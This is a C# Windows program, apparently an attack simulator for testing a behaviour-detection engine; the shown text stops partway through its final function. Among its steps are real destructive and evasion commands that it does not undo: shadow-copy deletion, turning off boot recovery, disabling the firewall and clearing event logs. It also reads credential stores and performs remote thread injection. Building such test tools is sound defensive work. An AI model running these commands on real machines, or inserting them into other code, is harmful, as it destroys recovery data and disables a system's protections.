using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using Microsoft.Win32;

[SupportedOSPlatform("windows")]
public static class Simulator
{
    private static readonly string Drop =
        Path.Combine(Path.GetTempPath(), $"sim_{Environment.ProcessId}");

    private static CancellationTokenSource _cts = new();
    private static Task? _currentSequence = null;
    private static readonly byte[] _exitStub = [0x31, 0xC0, 0xC3];

    private const uint ProcessCreateThread = 0x0002;
    private const uint ProcessQueryInformation = 0x0400;
    private const uint ProcessVmOperation = 0x0008;
    private const uint ProcessVmWrite = 0x0020;
    private const uint MemCommitReserve = 0x3000;
    private const uint PageExecuteReadWrite = 0x40;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint desiredAccess, bool inheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(
        IntPtr processHandle,
        IntPtr address,
        UIntPtr size,
        uint allocationType,
        uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
        IntPtr processHandle,
        IntPtr baseAddress,
        byte[] buffer,
        int size,
        out IntPtr bytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateRemoteThread(
        IntPtr processHandle,
        IntPtr threadAttributes,
        uint stackSize,
        IntPtr startAddress,
        IntPtr parameter,
        uint creationFlags,
        out uint threadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr handle);

    public static async Task Main()
    {
        Console.WriteLine("==============================================");
        Console.WriteLine("   CYBER BEHAVIOUR PROFILING SIMULATOR");
        Console.WriteLine("==============================================");
        Console.WriteLine(" --- MODE 1 (Standard) ---");
        Console.WriteLine(" [1] MALICIOUS  - Escalating threat chain");
        Console.WriteLine(" [2] SUSPICIOUS - Probing and scanning");
        Console.WriteLine(" [3] BENIGN     - Ordinary software behavior");
        Console.WriteLine(" --- MODE 2 (Alternative Variation) ---");
        Console.WriteLine(" [4] MALICIOUS  - Stealth/Fileless & Persistence");
        Console.WriteLine(" [5] SUSPICIOUS - System & Service Discovery");
        Console.WriteLine(" [6] BENIGN     - Heavy Data & DB churn");
        Console.WriteLine(" [Q] QUIT");
        Console.WriteLine("----------------------------------------------");
        Console.WriteLine(" NOTE: Press 1-6 at ANY TIME during execution");
        Console.WriteLine(" to interrupt the current script and switch behaviors.");
        Console.WriteLine("==============================================\n");

        Directory.CreateDirectory(Drop);

        while (true)
        {
            var key = Console.ReadKey(true).KeyChar;
            if (key == 'q' || key == 'Q')
                break;

            if (key >= '1' && key <= '6')
            {
                // Cancel current sequence if one is running
                if (_currentSequence != null && !_currentSequence.IsCompleted)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("\n[!] INTERRUPT SIGNAL RECEIVED - ABORTING CURRENT SCRIPT...");
                    Console.ResetColor();
                    _cts.Cancel();
                    try { await _currentSequence; } catch { } 
                }

                _cts = new CancellationTokenSource();
                int mode = key - '0';
                
                string modeName = mode switch {
                    1 or 4 => "MALICIOUS",
                    2 or 5 => "SUSPICIOUS",
                    3 or 6 => "BENIGN",
                    _ => "UNKNOWN"
                };
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"\n==============================================");
                Console.WriteLine($" INITIATING {modeName} SEQUENCE (MODE {(mode <= 3 ? 1 : 2)})");
                Console.WriteLine($"==============================================");
                Console.ResetColor();

                _currentSequence = RunMode(mode, _cts.Token);
            }
        }

        await Cleanup();
    }

    private static async Task RunMode(int mode, CancellationToken ct)
    {
        try
        {
            switch (mode)
            {
                // Mode 1
                case 1: await RunMalicious(ct); break;
                case 2: await RunSuspicious(ct); break;
                case 3: await RunInconclusive(ct); break;
                // Mode 2
                case 4: await RunMalicious2(ct); break;
                case 5: await RunSuspicious2(ct); break;
                case 6: await RunInconclusive2(ct); break;
            }
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"\n[✓] Sequence finished safely.");
            Console.ResetColor();
        }
        catch (OperationCanceledException)
        {
            // Expected when user interrupts
        }
    }

    static async Task RunMalicious(CancellationToken ct)
    {
        await Phase("1 — BASELINE",                     () => Baseline(ct), ct);
        await Phase("2 — DOWNLOAD & DROP",              () => Mal_DownloadAndDrop(ct), ct);
        await Phase("3 — LOLBIN & WMI EXECUTION",       () => Mal_LolbinExecution(ct), ct);
        await Phase("4 — REGISTRY PERSISTENCE",         () => Mal_RegistryPersistence(ct), ct);
        await Phase("5 — CREDENTIAL HARVESTING",        () => Mal_CredentialHarvest(ct), ct);
        await Phase("6 — DATA STAGING & EXFILTRATION",    () => Mal_DataStagingAndExfil(ct), ct);
        await Phase("7 — RANSOMWARE ENCRYPTION",        () => Mal_RansomwareSim(ct), ct);
        await Phase("8 — ANTI-RECOVERY (VSS DELETION)", () => Mal_AntiRecovery(ct), ct);
        await Phase("9 — FILE CHURN",                   () => Mal_FileChurn(ct), ct);
        await Phase("10 — SELF-DELETION",               () => Mal_SelfDeletion(ct), ct);
    }

    static async Task RunSuspicious(CancellationToken ct)
    {
        await Phase("1 — BASELINE",                () => Baseline(ct), ct);
        await Phase("2 — CREDENTIAL PROBE",        () => Sus_CredentialProbe(ct), ct);
        await Phase("3 — SYSTEM DISCOVERY TOOLS",  () => Sus_DiscoveryTools(ct), ct);
        await Phase("4 — PROCESS SPAWNING",        () => Sus_ProcessSpawns(ct), ct);
        await Phase("5 — SCRIPT ENGINE PROBING",   () => Sus_ScriptEngines(ct), ct);
        await Phase("6 — NETWORK PROBING",         () => Sus_NetworkProbe(ct), ct);
        await Phase("7 — RAPID FILE WRITES",       () => Sus_RapidWrites(ct), ct);
    }

    static async Task RunInconclusive(CancellationToken ct)
    {
        await Phase("1 — BASELINE",               () => Baseline(ct), ct);
        await Phase("2 — ORDINARY FILE ACTIVITY", () => Inc_FileActivity(ct), ct);
        await Phase("3 — SINGLE NETWORK CALL",    () => Inc_SingleNetwork(ct), ct);
        await Phase("4 — TEMP FILE WRITES",       () => Inc_TempWrites(ct), ct);
        await Phase("5 — DIRECTORY CHECKS",       () => Inc_DirectoryChecks(ct), ct);
    }

    // --- MODE 2 VARIATIONS ---
    static async Task RunMalicious2(CancellationToken ct)
    {
        await Phase("1 — BASELINE",                     () => Baseline(ct), ct);
        await Phase("2 — SCHEDULED TASK PERSISTENCE",   () => Mal2_ScheduledTask(ct), ct);
        await Phase("3 — FIREWALL EVASION",             () => Mal2_FirewallEvasion(ct), ct);
        await Phase("4 — CLEAR EVENT LOGS",             () => Mal2_ClearEventLogs(ct), ct);
        await Phase("5 — HIDDEN POWERSHELL (FILELESS)", () => Mal2_FilelessExecution(ct), ct);
        await Phase("6 — REMOTE THREAD INJECTION",      () => Mal2_RemoteThreadInjection(ct), ct);
        await Phase("7 — PROCESS HOLLOWING (SYSMON NOTE)", () => Mal2_ProcessHollowingNote(ct), ct);
    }

    static async Task RunSuspicious2(CancellationToken ct)
    {
        await Phase("1 — BASELINE",                   () => Baseline(ct), ct);
        await Phase("2 — SERVICE ENUMERATION",        () => Sus2_ServiceEnum(ct), ct);
        await Phase("3 — EXCESSIVE REGISTRY QUERIES", () => Sus2_RegistryQueries(ct), ct);
        await Phase("4 — HEAVY PING (DISCOVERY)",     () => Sus2_NetworkDiscovery(ct), ct);
    }

    static async Task RunInconclusive2(CancellationToken ct)
    {
        await Phase("1 — BASELINE",               () => Baseline(ct), ct);
        await Phase("2 — SQLITE DB CHURN",        () => Inc2_DbChurn(ct), ct);
        await Phase("3 — BROWSER CACHE WRITES",   () => Inc2_BrowserCache(ct), ct);
    }

    static async Task Baseline(CancellationToken ct)
    {
        string[] probes =
        {
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Environment.SystemDirectory,
        };
        for (int i = 0; i < 10; i++)
        {
            ct.ThrowIfCancellationRequested();
            foreach (var dir in probes)
                _ = Directory.Exists(dir);
            await Task.Delay(2000, ct);
            Log($"  baseline tick {i + 1}/10");
        }
    }

    static async Task Mal_DownloadAndDrop(CancellationToken ct)
    {
        string staging = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "WindowsUpdate", "cache");
        Directory.CreateDirectory(staging);

        byte[] bytes;
        try
        {
            using var http = new HttpClient();
            http.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
            bytes = await http.GetByteArrayAsync("https://github.com", ct);
        }
        catch
        {
            bytes = new byte[512];
            bytes[0] = 0x4D; bytes[1] = 0x5A;
            Log("  (offline — using synthetic PE bytes)");
        }

        string exePath = Path.Combine(staging, "svcupdate.exe");
        string batPath = Path.Combine(staging, "install.bat");
        string ps1Path = Path.Combine(staging, "stage.ps1");
        string dllPath = Path.Combine(staging, "helper.dll");

        await File.WriteAllBytesAsync(exePath, bytes, ct);
        await File.WriteAllTextAsync(batPath, "@echo off\r\necho installing...", ct);
        await File.WriteAllTextAsync(ps1Path, "# stage loader", ct);
        await File.WriteAllTextAsync(dllPath, "MZ", ct);

        Log($"  Dropped: {exePath}");
        Log($"  Dropped: {batPath}");
        Log($"  Dropped: {ps1Path}");
        Log($"  Dropped: {dllPath}");

        _extraDirs.Add(staging);
        await Task.Delay(1000, ct);
    }

    static async Task Mal_LolbinExecution(CancellationToken ct)
    {
        await Spawn("powershell.exe",
            "-ExecutionPolicy Bypass -NoProfile -Command \"Write-Host 'Simulated payload execution'; Start-Sleep 2\"",
            showWindow: true);
        await Task.Delay(1500, ct);

        string cmd     = "Write-Host 'payload'";
        string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(cmd));
        Log("Spawning powershell.exe -EncodedCommand <base64> ...");
        await Spawn("powershell.exe", $"-EncodedCommand {encoded}", showWindow: true);
        await Task.Delay(1500, ct);

        Log("Spawning wmic.exe (WMI Execution)...");
        await Spawn("wmic.exe", "process call create \"cmd.exe /c echo WMI Spawned\"");
        await Task.Delay(1000, ct);

        Log("Spawning certutil.exe (LOLBin) ...");
        await Spawn("certutil.exe",
            "-hashfile \"" + Environment.GetCommandLineArgs()[0] + "\" MD5");
        await Task.Delay(1000, ct);

        Log("Spawning mshta.exe (LOLBin) ...");
        await Spawn("mshta.exe", "about:blank");
        await Task.Delay(1000, ct);
    }

    static async Task Mal_RegistryPersistence(CancellationToken ct)
    {
        const string runKey  = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        const string valName = "SimUpdate";

        Log($"Writing HKCU\\{runKey}\\{valName} ...");
        using (var key = Registry.CurrentUser.OpenSubKey(runKey, writable: true))
            key?.SetValue(valName, @"C:\Windows\Temp\svcupdate.exe");
        await Task.Delay(2000, ct);

        Log("  Removing persistence key...");
        using (var key = Registry.CurrentUser.OpenSubKey(runKey, writable: true))
            key?.DeleteValue(valName, throwOnMissingValue: false);

        Log("Reading Winlogon key...");
        using var wl = Registry.LocalMachine.OpenSubKey(
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
        Log($"  Userinit = {wl?.GetValue("Userinit") ?? "(no access)"}");
        await Task.Delay(500, ct);
    }

    static async Task Mal_CredentialHarvest(CancellationToken ct)
    {
        string appdata  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string localapp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string home     = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        // --- A: probe common credential file locations (existence only) ---
        string[] probeTargets =
        {
            Path.Combine(localapp, "Google", "Chrome", "User Data", "Default", "Login Data"),
            Path.Combine(localapp, "Google", "Chrome", "User Data", "Default", "Cookies"),
            Path.Combine(home, ".ssh", "id_rsa"),
            Path.Combine(home, ".ssh", "known_hosts"),
            Path.Combine(appdata, "Mozilla", "Firefox", "Profiles"),
        };
        Log("Probing credential file locations...");
        foreach (var target in probeTargets)
        {
            ct.ThrowIfCancellationRequested();
            try   { Log($"  {(File.Exists(target) || Directory.Exists(target) ? "[found]" : "[not found]")} {target}"); }
            catch { Log($"  [denied] {target}"); }
            await Task.Delay(200, ct);
        }

        // --- B: READ from DPAPI Protect store (\protect\ in path → SensitiveDirAccess hard indicator) ---
        Log("Attempting to read DPAPI master key store...");
        string protectDir = Path.Combine(appdata, "Microsoft", "Protect");
        try
        {
            foreach (var entry in Directory.EnumerateFileSystemEntries(protectDir))
            {
                ct.ThrowIfCancellationRequested();
                try
                {
                    using var fs = File.Open(entry, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    byte[] buf = new byte[Math.Min((int)fs.Length, 32)];
                    _ = await fs.ReadAsync(buf, ct);
                    Log($"  [read]   {entry}");
                }
                catch { Log($"  [denied] {entry}"); }
                await Task.Delay(150, ct);
            }
        }
        catch { Log($"  [no access] {protectDir}"); }

        // --- C: READ from Credential Manager store (\credentials\ in path → SensitiveDirAccess hard indicator) ---
        Log("Attempting to read Windows Credential Manager store...");
        string credDir = Path.Combine(appdata, "Microsoft", "Credentials");
        try
        {
            foreach (var credFile in Directory.EnumerateFiles(credDir))
            {
                ct.ThrowIfCancellationRequested();
                try
                {
                    using var fs = File.Open(credFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    byte[] buf = new byte[Math.Min((int)fs.Length, 32)];
                    _ = await fs.ReadAsync(buf, ct);
                    Log($"  [read]   {credFile}");
                }
                catch { Log($"  [denied] {credFile}"); }
                await Task.Delay(150, ct);
            }
        }
        catch { Log($"  [no access] {credDir}"); }

        // --- D: WRITE a staged dump to the Credentials folder ─────────────
        // Filename contains "credentials" → matches _sensitiveFiles list → fires
        // credential_file_access category event regardless of FileWrite noise check.
        // That category is a hard indicator, bypassing all trust dampening.
        Log("Writing staged credential dump to Credentials store...");
        string dumpPath = Path.Combine(credDir, "sim_credentials.dump");
        try
        {
            await File.WriteAllTextAsync(dumpPath, "SIM:CREDENTIAL_DUMP:PLACEHOLDER", ct);
            Log($"  [written] {dumpPath}");
            await Task.Delay(800, ct);
            File.Delete(dumpPath);
            Log($"  [cleaned] {dumpPath}");
        }
        catch { Log($"  [denied] credential dump write to {dumpPath}"); }
    }

    static async Task Mal_DataStagingAndExfil(CancellationToken ct)
    {
        Log("Archiving stolen credentials into staging folder...");
        string stageDir = Path.Combine(Drop, "staging");
        Directory.CreateDirectory(stageDir);
        string zipPath = Path.Combine(stageDir, "loot.zip");

        // Write a fake ZIP file with the PK header
        byte[] fakeZip = { 0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00 };
        await File.WriteAllBytesAsync(zipPath, fakeZip, ct);
        Log($"  Zipped stolen data to: {zipPath}");
        await Task.Delay(800, ct);

        // Simulate additional rapid staging (writing small chunks of data)
        int count = 0;
        for (int round = 0; round < 4; round++)
        {
            ct.ThrowIfCancellationRequested();
            string path = Path.Combine(stageDir, $"chunk_{count++}.bin");
            await File.WriteAllBytesAsync(path, Encoding.UTF8.GetBytes(new string('A', 512)), ct);
            await Task.Delay(50, ct);
        }
        Log($"  Wrote {count} additional staged payload chunks.");

        Log("Simulating suspicious DNS resolution...");
        string[] suspiciousDnsTargets =
        {
            "pastebin.com",
            "raw.githubusercontent.com",
            "api.telegram.org"
        };
        foreach (var dnsQuery in suspiciousDnsTargets)
        {
            ct.ThrowIfCancellationRequested();
            Log($"  DNS Query: {dnsQuery}");
            try { System.Net.Dns.GetHostEntry(dnsQuery); } catch { }
            await Task.Delay(100, ct);
        }

        Log("Calling out to Command & Control (Exfiltrating staging files)...");
        using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
        foreach (var host in new[] { "https://api.github.com", "https://pastebin.com/raw/example" })
        {
            ct.ThrowIfCancellationRequested();
            try   { _ = await http.GetStringAsync(host, ct); Log($"  Connected and sent: {host}"); }
            catch { Log($"  (no route to {host})"); }
            await Task.Delay(300, ct);
        }
    }

    static async Task Mal_FileChurn(CancellationToken ct)
    {
        string churnDir = Path.Combine(Drop, "churn");
        Directory.CreateDirectory(churnDir);
        var written = new List<string>();

        Log("Writing 30 files then deleting them (churn)...");
        for (int i = 0; i < 30; i++)
        {
            ct.ThrowIfCancellationRequested();
            string p = Path.Combine(churnDir, $"tmp_{i}.dat");
            await File.WriteAllTextAsync(p, $"churn {i}", ct);
            written.Add(p);
            await Task.Delay(30, ct);
        }
        await Task.Delay(300, ct);
        foreach (var p in written)
        {
            ct.ThrowIfCancellationRequested();
            try { File.Delete(p); } catch { }
            await Task.Delay(15, ct);
        }
        Log($"  Churned {written.Count} files.");
    }

    static async Task Mal_RansomwareSim(CancellationToken ct)
    {
        string docsFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        string rnsmDir = Path.Combine(Drop, "locked_files");
        Directory.CreateDirectory(rnsmDir);
        
        Log("Simulating mass encryption of documents...");
        for (int i = 0; i < 20; i++)
        {
            ct.ThrowIfCancellationRequested();
            string original = Path.Combine(rnsmDir, $"financial_record_{i}.pdf");
            string encrypted = Path.Combine(rnsmDir, $"financial_record_{i}.pdf.locked");
            
            await File.WriteAllTextAsync(original, "dummy data", ct);
            await File.WriteAllBytesAsync(encrypted, new byte[] { 0x55, 0xAA, 0xFF }, ct);
            try { File.Delete(original); } catch { }
            
            await Task.Delay(20, ct);
        }
        
        Log("Dropping ransomware note...");
        string rnote = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "README_RECOVER_FILES.txt");
        try { await File.WriteAllTextAsync(rnote, "All your files are encrypted.", ct); _extraDirs.Add(rnote); } catch { }
        await Task.Delay(1000, ct);
    }

    static async Task Mal_AntiRecovery(CancellationToken ct)
    {
        Log("Executing Anti-Recovery (Volume Shadow Copy Deletion)...");
        await Spawn("vssadmin.exe", "delete shadows /all /quiet", showWindow: false);
        await Task.Delay(1500, ct);

        Log("Executing BCD modification (Disabling Recovery Mode)...");
        await Spawn("bcdedit.exe", "/set {default} recoveryenabled No", showWindow: false);
        await Task.Delay(1500, ct);
    }

    static async Task Mal_SelfDeletion(CancellationToken ct)
    {
        string marker = Path.Combine(Drop, "marker.exe");
        await File.WriteAllTextAsync(marker, "marker", ct);

        await Spawn("cmd.exe",
            $"/c ping -n 3 127.0.0.1 > nul && del /f /q \"{marker}\"");
        await Task.Delay(4000, ct);
        Log("  Done.");
    }

    // Simulates a failed credential probe — attempts to open protected credential files.
    // Access is denied for most of these (Chrome locks Login Data, SAM is always protected),
    // but the open ATTEMPT fires ETW FileIOCreate events which are classified as
    // credential_file_access. This represents a real-world scenario where an attacker
    // probes for credentials but cannot extract them (e.g. browser is running, no admin rights).
    static async Task Sus_CredentialProbe(CancellationToken ct)
    {
        string localapp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string appdata  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string home     = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        string[] targets =
        {
            Path.Combine(localapp, "Google", "Chrome",   "User Data", "Default", "Login Data"),
            Path.Combine(localapp, "Google", "Chrome",   "User Data", "Default", "Cookies"),
            Path.Combine(localapp, "Microsoft", "Edge",  "User Data", "Default", "Login Data"),
            Path.Combine(appdata,  "Mozilla", "Firefox", "Profiles"),
            Path.Combine(home,     ".ssh", "id_rsa"),
            Path.Combine(home,     ".ssh", "known_hosts"),
            @"C:\Windows\System32\config\SAM",
        };

        Log("Probing credential file locations (access will be denied for protected files)...");
        foreach (var target in targets)
        {
            ct.ThrowIfCancellationRequested();
            try
            {
                using var fs = File.Open(target, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                Log($"  [opened] {target}");
            }
            catch
            {
                Log($"  [denied/absent] {target}");
            }
            await Task.Delay(400, ct);
        }
    }

    static async Task Sus_DiscoveryTools(CancellationToken ct)
    {
        (string exe, string args)[] commands =
        {
            ("whoami.exe",     "/all"),
            ("ipconfig.exe",   "/all"),
            ("systeminfo.exe", ""),
            ("netstat.exe",    "-an"),
            ("tasklist.exe",   ""),
            ("hostname.exe",   ""),
        };

        Log("Running system discovery commands...");
        foreach (var (exe, args) in commands)
        {
            ct.ThrowIfCancellationRequested();
            Log($"  Spawning {exe} {args}");
            await Spawn(exe, args);
            await Task.Delay(800, ct);
        }
    }

    static async Task Sus_ProcessSpawns(CancellationToken ct)
    {
        await Spawn("cmd.exe", "/c echo System check complete");
        await Task.Delay(1000, ct);

        await Spawn("powershell.exe",
            "-Command \"Get-Date; Get-Process | Select-Object -First 5\"",
            showWindow: true);
        await Task.Delay(1500, ct);

        Log("Spawning certutil.exe (hash check only)...");
        await Spawn("certutil.exe",
            "-hashfile \"" + Environment.GetCommandLineArgs()[0] + "\" SHA256");
        await Task.Delay(1000, ct);
    }

    static async Task Sus_ScriptEngines(CancellationToken ct)
    {
        Log("Probing Script Engines (cscript, wscript, rundll32)...");
        await Spawn("cscript.exe", "//B //Nologo", showWindow: false);
        await Task.Delay(800, ct);

        await Spawn("wscript.exe", "//E:vbs", showWindow: false);
        await Task.Delay(800, ct);

        await Spawn("rundll32.exe", "shell32.dll,Control_RunDLL", showWindow: true);
        await Task.Delay(1000, ct);
    }

    static async Task Sus_NetworkProbe(CancellationToken ct)
    {
        Log("Making outbound HTTP connections...");
        using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
        string[] urls =
        {
            "https://www.google.com",
            "https://github.com",
            "https://ipinfo.io/json",
        };

        foreach (var url in urls)
        {
            ct.ThrowIfCancellationRequested();
            try   { _ = await http.GetStringAsync(url, ct); Log($"  Connected: {url}"); }
            catch { Log($"  (no route to {url})"); }
            await Task.Delay(500, ct);
        }
    }

    static async Task Sus_RapidWrites(CancellationToken ct)
    {
        string dir = Path.Combine(Drop, "scratch");
        Directory.CreateDirectory(dir);

        Log("Writing 20 temporary data files quickly...");
        for (int i = 0; i < 20; i++)
        {
            ct.ThrowIfCancellationRequested();
            string p = Path.Combine(dir, $"note_{i}.txt");
            await File.WriteAllTextAsync(p, $"scratch data {i}", ct);
            await Task.Delay(60, ct);
        }
        Log("  Done.");
        await Task.Delay(500, ct);
    }

    static async Task Inc_FileActivity(CancellationToken ct)
    {
        string[] paths =
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Desktop"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
        };

        Log("Enumerating ordinary user directories...");
        foreach (var p in paths)
        {
            ct.ThrowIfCancellationRequested();
            await ProbeDirectoryAsync(p, ct, sampleRead: true);
            await Task.Delay(500, ct);
        }
    }

    static async Task Inc_SingleNetwork(CancellationToken ct)
    {
        Log("Making a single HTTP request...");
        try
        {
            using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };
            _ = await http.GetStringAsync("https://www.google.com", ct);
            Log("  Connected to www.google.com");
        }
        catch { Log("  (no route)"); }
        await Task.Delay(500, ct);
    }

    static async Task Inc_TempWrites(CancellationToken ct)
    {
        Log("Writing 3 temp files...");
        for (int i = 0; i < 3; i++)
        {
            ct.ThrowIfCancellationRequested();
            string p = Path.Combine(Drop, $"cache_{i}.dat");
            await File.WriteAllTextAsync(p, $"cached value {i}", ct);
            Log($"  Wrote {p}");
            await Task.Delay(400, ct);
        }
    }

    static async Task Inc_DirectoryChecks(CancellationToken ct)
    {
        string[] dirs =
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Common Files"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Fonts"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft"),
        };

        Log("Enumerating common system directories...");
        foreach (var dir in dirs)
        {
            ct.ThrowIfCancellationRequested();
            await ProbeDirectoryAsync(dir, ct, sampleRead: true);
            await Task.Delay(400, ct);
        }
    }

    static async Task ProbeDirectoryAsync(string dir, CancellationToken ct, bool sampleRead)
    {
        ct.ThrowIfCancellationRequested();

        if (!Directory.Exists(dir))
        {
            Log($"  [absent] {dir}");
            return;
        }

        Log($"  [exists] {dir}");

        try
        {
            int shown = 0;
            foreach (var entry in Directory.EnumerateFileSystemEntries(dir))
            {
                Log($"    [entry] {entry}");
                shown++;
                if (shown >= 3)
                    break;
            }

            if (shown == 0)
                Log("    [empty]");
        }
        catch
        {
            Log($"    [enumeration denied] {dir}");
        }

        if (!sampleRead)
            return;

        string? sampleFile = FindFirstFile(dir, maxDepth: 2);
        if (string.IsNullOrEmpty(sampleFile))
        {
            Log("    [no file to sample]");
            return;
        }

        try
        {
            using var fs = File.Open(sampleFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            int sampleLength = fs.Length > 0 ? (int)Math.Min(fs.Length, 32) : 1;
            byte[] buffer = new byte[sampleLength];
            _ = await fs.ReadAsync(buffer, ct);
            Log($"    [sample read] {sampleFile}");
        }
        catch
        {
            Log($"    [sample read denied] {sampleFile}");
        }
    }

    static string? FindFirstFile(string root, int maxDepth)
    {
        var pending = new Queue<(string Path, int Depth)>();
        pending.Enqueue((root, 0));

        while (pending.Count > 0)
        {
            var (dir, depth) = pending.Dequeue();

            try
            {
                foreach (var file in Directory.EnumerateFiles(dir))
                    return file;

                if (depth >= maxDepth)
                    continue;

                int queued = 0;
                foreach (var subDir in Directory.EnumerateDirectories(dir))
                {
                    pending.Enqueue((subDir, depth + 1));
                    queued++;
                    if (queued >= 3)
                        break;
                }
            }
            catch
            {
            }
        }

        return null;
    }

    private static readonly List<string> _extraDirs = [];

    static async Task Phase(string name, Func<Task> action, CancellationToken ct) 
    {
        ct.ThrowIfCancellationRequested();
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine($"\n>> [PHASE] {name}");
        Console.ResetColor();
        await action();
    }

    static void Log(string msg) 
    { 
        Console.WriteLine(msg); 
    }

    static async Task Spawn(string exe, string args, bool showWindow = false)
    {
        try
        {
            var psi = new ProcessStartInfo(exe, args)
            {
                CreateNoWindow  = !showWindow,
                UseShellExecute = false,
            };
            using var p = Process.Start(psi);
            await Task.Run(() => p?.WaitForExit(5000));
        }
        catch { }
    }

    static async Task Cleanup()
    {
        foreach (var dir in _extraDirs)
            try { Directory.Delete(dir, recursive: true); } catch { }
        try { Directory.Delete(Drop, recursive: true); } catch { }
        await Task.CompletedTask;
    }

    // --- NEW MODE 2 IMPLEMENTATIONS ---
    
    static async Task Mal2_ScheduledTask(CancellationToken ct)
    {
        Log("Adding scheduled task for persistence...");
        await Spawn("schtasks.exe", "/create /tn \"SimulatedThreat\" /tr \"cmd.exe /c echo task\" /sc onlogon /f", showWindow: false);
        await Task.Delay(1500, ct);

        Log("Removing scheduled task...");
        await Spawn("schtasks.exe", "/delete /tn \"SimulatedThreat\" /f", showWindow: false);
    }

    static async Task Mal2_FirewallEvasion(CancellationToken ct)
    {
        Log("Attempting to modify firewall rules via netsh...");
        await Spawn("netsh.exe", "advfirewall set allprofiles state off", showWindow: false);
        await Task.Delay(1500, ct);
    }

    static async Task Mal2_ClearEventLogs(CancellationToken ct)
    {
        Log("Attempting to clear System and Application event logs (Defense Evasion)...");
        await Spawn("wevtutil.exe", "cl System", showWindow: false);
        await Task.Delay(500, ct);
        await Spawn("wevtutil.exe", "cl Application", showWindow: false);
        await Task.Delay(1000, ct);
    }

    static async Task Mal2_FilelessExecution(CancellationToken ct)
    {
        Log("Spawning powershell with hidden window and bypass to simulate fileless execution...");
        await Spawn("powershell.exe", "-w hidden -ep bypass -nop -c \"Start-Sleep -Seconds 5\"", showWindow: false);
        await Task.Delay(2000, ct);
    }

    static async Task Mal2_RemoteThreadInjection(CancellationToken ct)
    {
        Log("Launching notepad.exe as a sacrificial remote-thread target...");
        using var sacrificial = Process.Start(new ProcessStartInfo("notepad.exe")
        {
            UseShellExecute = true
        });

        if (sacrificial == null)
        {
            Log("  Failed to launch notepad.exe; skipping injection phase.");
            return;
        }

        try
        {
            await Task.Delay(1500, ct);

            uint access = ProcessCreateThread | ProcessQueryInformation | ProcessVmOperation | ProcessVmWrite;
            IntPtr processHandle = OpenProcess(access, false, sacrificial.Id);
            if (processHandle == IntPtr.Zero)
            {
                Log($"  OpenProcess failed ({Marshal.GetLastWin32Error()}); skipping.");
                return;
            }

            try
            {
                IntPtr remoteBuffer = VirtualAllocEx(
                    processHandle,
                    IntPtr.Zero,
                    new UIntPtr((uint)_exitStub.Length),
                    MemCommitReserve,
                    PageExecuteReadWrite);

                if (remoteBuffer == IntPtr.Zero)
                {
                    Log($"  VirtualAllocEx failed ({Marshal.GetLastWin32Error()}); skipping.");
                    return;
                }

                if (!WriteProcessMemory(processHandle, remoteBuffer, _exitStub, _exitStub.Length, out IntPtr bytesWritten) ||
                    bytesWritten.ToInt64() != _exitStub.Length)
                {
                    Log($"  WriteProcessMemory failed ({Marshal.GetLastWin32Error()}); skipping.");
                    return;
                }

                IntPtr remoteThread = CreateRemoteThread(
                    processHandle,
                    IntPtr.Zero,
                    0,
                    remoteBuffer,
                    IntPtr.Zero,
                    0,
                    out uint threadId);

                if (remoteThread == IntPtr.Zero)
                {
                    Log($"  CreateRemoteThread failed ({Marshal.GetLastWin32Error()}); skipping.");
                    return;
                }

                try
                {
                    Log($"  Remote thread created in notepad.exe (PID {sacrificial.Id}, TID {threadId}).");
                    await Task.Delay(1000, ct);
                }
                finally
                {
                    CloseHandle(remoteThread);
                }
            }
            finally
            {
                CloseHandle(processHandle);
            }
        }
        finally
        {
            try
            {
                if (!sacrificial.HasExited)
                    sacrificial.Kill(entireProcessTree: true);
            }
            catch
            {
            }
        }
    }

    static async Task Mal2_ProcessHollowingNote(CancellationToken ct)
    {
        Log("Process tampering detection is wired to Sysmon Event ID 25.");
        Log("  Full process hollowing is intentionally not simulated here because it requires destructive image replacement in another process.");
